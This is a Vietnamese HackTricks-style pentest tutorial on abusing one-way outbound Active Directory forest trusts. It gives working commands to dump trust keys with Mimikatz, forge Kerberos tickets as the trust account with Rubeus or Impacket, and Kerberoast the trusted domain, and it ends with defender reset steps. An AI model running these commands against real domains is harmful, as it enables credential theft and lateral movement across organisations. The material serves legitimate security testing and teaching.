# Domain Forest Bên Ngoài - Một Chiều (Outbound)

{{#include ../../banners/hacktricks-training.md}}

Trong tình huống này, **domain của bạn** đang **trust** một số **privileges** dành cho các principal từ **domain/forest khác**.

## Enumeration

### Trust Outbound

```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```

Nếu bạn có AD module, hãy kiểm tra trực tiếp **Trusted Domain Object (TDO)**. Thao tác này cung cấp dữ liệu trust thô được lưu trong LDAP, cần thiết sau này để quyết định liệu hướng dễ hơn là **lạm dụng FSP/group** hay **lạm dụng trust-account**:

```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
  Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```

Bạn cũng nên liệt kê những nơi mà các principal từ `CN=ForeignSecurityPrincipals` thực sự được cấp quyền truy cập. Những trường hợp thường gặp là:

- **Local admin** trên một server/DC trong domain hiện tại của bạn
- Thành viên của **custom domain group** có ACL trên users/computers/GPOs
- Quyền sửa đổi **computer objects**, sau này có thể trở thành [RBCD](resource-based-constrained-delegation.md) nếu cấu hình trust cho phép

## Trust Account Attack

Khi tạo one-way trust từ domain/forest **B** sang domain/forest **A** (**B trusts A**), một **trust account** cho **B** sẽ được tạo trong **A**. Trong góc nhìn outbound-trust của **A**, điều này hữu ích vì nếu sau đó bạn compromise **B** (phía trusting), bạn có thể dump trust secret tại đó rồi xác thực ngược lại vào **A** với danh tính `B$`.<sup>[[1]](#references)</sup>

Điều quan trọng cần hiểu là password và Kerberos material của trust account đó có thể được trích xuất từ Domain Controller trong domain **trusting** bằng cách:<sup>[[1]](#references)</sup>

```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```

Điều này hoạt động vì tài khoản trust được tạo trong domain **trusted** là một principal được bật và có các quyền cơ bản của người dùng domain thông thường tại đó. Điều này thường đủ để bắt đầu liệt kê LDAP, yêu cầu ticket và tìm đường leo thang tiếp theo.<sup>[[1]](#references)</sup>

Trong kịch bản `ext.local` là domain **trusting** và `root.local` là domain **trusted**, một tài khoản người dùng tên `EXT$` được tạo bên trong `root.local`. Dump các khóa trust từ `ext.local` sẽ tiết lộ thông tin xác thực có thể dùng dưới dạng `root.local\EXT$` để truy cập `root.local`:<sup>[[1]](#references)</sup>

```bash
lsadump::trust /patch
```

Tiếp theo, sử dụng key **RC4** đã trích xuất để xác thực với tư cách `root.local\EXT$` trong `root.local`:<sup>[[1]](#references)</sup>

```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```

Sau đó enumerate trusted domain với tư cách principal đó, chẳng hạn bằng cách Kerberoasting một SPN có giá trị cao trong `root.local`:<sup>[[1]](#references)</sup>

```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```

### Từ Linux

Nếu bạn đã khôi phục khóa tài khoản trust **RC4**, cách làm tương tự cũng hoạt động trên Linux với Impacket:

```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```

Nếu **RC4** không được chấp nhận, hãy dùng **mật khẩu cleartext** đã khôi phục (hoặc các khóa **AES** được dẫn xuất), rồi tái sử dụng các workflow [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) và [Kerberoast](kerberoast.md) thông thường từ foothold đó.

### Các điểm cần lưu ý về key material

Đừng nhầm lẫn **trust keys** với **trust-account credentials**:<sup>[[1]](#references)</sup>

- Trong one-way trust, cả hai phía đều lưu một **TDO**, nhưng tài khoản người dùng **`EXT$`** thực sự chỉ tồn tại trong trusted domain.
- Mật khẩu hiện tại của trust account được phản ánh trong trust secret của TDO (`NewPassword` / trust key hiện tại).
- **RC4** trust key là artifact dễ tái sử dụng nhất cho `asktgt` dưới danh nghĩa trust account; trong các thiết lập mặc định, đây thường là enctype hoạt động được vì trust account thường có `msDS-SupportedEncryptionTypes` để trống.
- Nếu bạn đang nghĩ đến **AES trust keys**, hãy nhớ rằng chúng không thể thay thế cho AES keys của trust account vì salt khác nhau.

Vì vậy, với kỹ thuật trên trang này, hãy ưu tiên **RC4** material đã dump hoặc mật khẩu **cleartext** đã khôi phục.<sup>[[1]](#references)</sup>

### Thu thập mật khẩu trust dạng cleartext

Trong flow trước, trust hash được dùng thay cho **mật khẩu cleartext** (cũng được **mimikatz dump**).<sup>[[1]](#references)</sup>

Có thể lấy mật khẩu cleartext bằng cách chuyển đổi đầu ra \[ CLEAR ] từ mimikatz từ dạng hexadecimal và loại bỏ các null byte `\x00`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Thu thập mật khẩu trust dạng cleartext: Có thể lấy mật khẩu cleartext bằng cách chuyển đổi đầu ra ( CLEAR ) từ mimikatz từ dạng hexadecimal và loại bỏ các null...](<../../images/image (938).png>)

Đôi khi, khi tạo trust relationship, người dùng phải nhập mật khẩu cho trust. Trong minh họa này, key là mật khẩu trust ban đầu nên con người có thể đọc được. Khi key được xoay vòng (mặc định: mỗi 30 ngày), cleartext thường không còn đọc được bằng mắt, nhưng về mặt kỹ thuật vẫn có thể sử dụng.<sup>[[1]](#references)</sup>

Có thể dùng mật khẩu cleartext để xác thực thông thường dưới danh nghĩa trust account, thay vì yêu cầu TGT bằng Kerberos secret key của trust account. Ở đây, truy vấn `root.local` từ `ext.local` để tìm thành viên của `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Thu thập mật khẩu trust dạng cleartext: Có thể dùng mật khẩu cleartext để xác thực thông thường dưới danh nghĩa trust account, thay vì yêu cầu TGT...](<../../images/image (792).png>)

### Các hạn chế thực tế

> [!WARNING]
> Trust account là các principal khá khó xử lý. Đăng nhập tương tác như **RUNAS / console / RDP** không phải là cách dùng dự kiến ở đây, và các lần thử xác thực **NTLM** có thể thất bại với `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Hãy dùng **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Lưu ý về persistence / cleanup

Nếu defenders nhận ra trusting domain đã bị compromise, họ nên xoay trust secret ở **cả hai phía** bằng `netdom trust ... /resetOneSide ...`. Từ góc độ operator, điều này quan trọng vì **reset thủ công lập tức vô hiệu hóa trust material cũ**, trong khi quá trình xoay trust password thông thường giữ lại các giá trị hiện tại/trước đó trong thời gian rollover.<sup>[[2]](#references)</sup>

```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```

## References

- [1] [SID filter như ranh giới bảo mật giữa các domain? (Phần 7) – Tấn công tài khoản trust – từ domain tin cậy đến domain được tin cậy](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [Khôi phục AD Forest – Đặt lại mật khẩu trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)
{{#include ../../banners/hacktricks-training.md}}
